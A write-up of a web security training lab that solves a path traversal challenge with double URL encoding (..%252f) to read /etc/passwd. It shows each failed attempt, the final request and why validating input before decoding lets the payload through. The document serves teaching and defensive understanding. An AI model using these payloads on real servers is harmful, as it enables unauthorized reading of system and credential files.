# 🧪 Lab: File Path Traversal (Traversal Sequences Stripped with Superfluous URL-Decode)

## 🎯 Objective

Exploit a path traversal vulnerability to retrieve the contents of:

```id="l9x2mz"
/etc/passwd
```

<img width="988" height="450" alt="1 lab" src="https://github.com/user-attachments/assets/861c93f2-00df-4625-b735-2240c5b27a3e" />

---

## 🔍 Lab Overview

* The application blocks traversal patterns like `../`.
* Then it performs **URL decoding** before using the input.

👉 **Key flaw:** Input is **validated before decoding**, allowing encoded payloads to bypass filters.

---

## 🚶 Step-by-Step Solution

### 🖼️ 1. Capture Image Request

* Navigate to any product page.

* Intercept request:

  ```
  GET /image?filename=x.jpg HTTP/2
  ```

* Send it to **Repeater**.

<img width="780" height="721" alt="2 image-intercept" src="https://github.com/user-attachments/assets/8fca372b-677f-429d-bbaa-787624e4700a" />

---

### 🧪 2. Try Basic Payloads (All Fail)

#### Attempt 1:

```
../../../etc/passwd
```


#### Attempt 2:

```
/etc/passwd
```



#### Attempt 3:

```
....//....//....//etc/passwd
```


* Result for all:

  ```
  400 Bad Request
  No such file
  ```

👉 **Why they fail?**

* The application detects traversal patterns like `../`
* It blocks them **before processing further**

---

### 🧠 3. Try Single URL Encoding

* Encode:

  ```
  ../../../etc/passwd
  ```

* Payload:

  ```
  ..%2f..%2f..%2fetc%2fpasswd
  ```

<img width="425" height="628" alt="6 inspector-incode" src="https://github.com/user-attachments/assets/6744b6f4-e2fe-41fc-9aaf-9a5428f3fd14" />

* Send request.

* Result:

  ```
  400 Bad Request
  No such file
  ```

<img width="1173" height="720" alt="7 no-such-file" src="https://github.com/user-attachments/assets/59359594-1d92-45a8-bf7d-15356cdfe942" />

👉 **Why it still fails?**

* The server decodes input once:

  ```
  ..%2f → ../
  ```
* After decoding, filter detects traversal and blocks it.

---

### 🔁 4. Apply Double URL Encoding (Bypass)

* Encode the already encoded payload again:

#### First encoding:

```
..%2f..%2f..%2fetc%2fpasswd
```

#### Second encoding:

```
..%252f..%252f..%252fetc%252fpasswd
```

---

### 🚀 5. Send Exploit Request

* Final request:

  ```
  GET /image?filename=..%252f..%252f..%252fetc%252fpasswd HTTP/2
  ```

* Send the request.

<img width="424" height="624" alt="8 usrl-encode" src="https://github.com/user-attachments/assets/3132e36d-64e4-4f17-99d3-cde2e5826128" />

* Result:

  ```
  HTTP/2 200 OK
  ```

* Response:

  ```
  Contents of /etc/passwd
  ```

<img width="1189" height="718" alt="9 200-ok" src="https://github.com/user-attachments/assets/bdc3e937-7931-43aa-a1b8-7430fc4fd83d" />

---

### 📄 6. Why This Works

👉 **Step-by-step breakdown:**

1. Application checks input:

   ```
   ..%252f → does NOT match ../ → allowed
   ```

2. First decode:

   ```
   %25 → %
   → ..%2f
   ```

3. Second decode (during processing):

   ```
   %2f → /
   → ../
   ```

4. Final path becomes:

   ```
   ../../../etc/passwd
   ```

👉 **Key Insight:**

* Validation happens **before decoding**
* Double encoding delays the appearance of `../` until after validation

---

### ✅ 7. Lab Solved

* Successfully retrieved:

  ```
  /etc/passwd
  ```
* Lab is complete.

<img width="911" height="707" alt="10 solved" src="https://github.com/user-attachments/assets/92b825ff-fba2-4023-a146-bbe777e73334" />

---

## 🧠 Why This Attack Works

* The application:

  * Blocks traversal sequences **before decoding**
  * Decodes input later during processing

* Attacker strategy:

  1. Hide traversal using encoding
  2. Let the server decode it later
  3. Achieve traversal after validation is bypassed

---
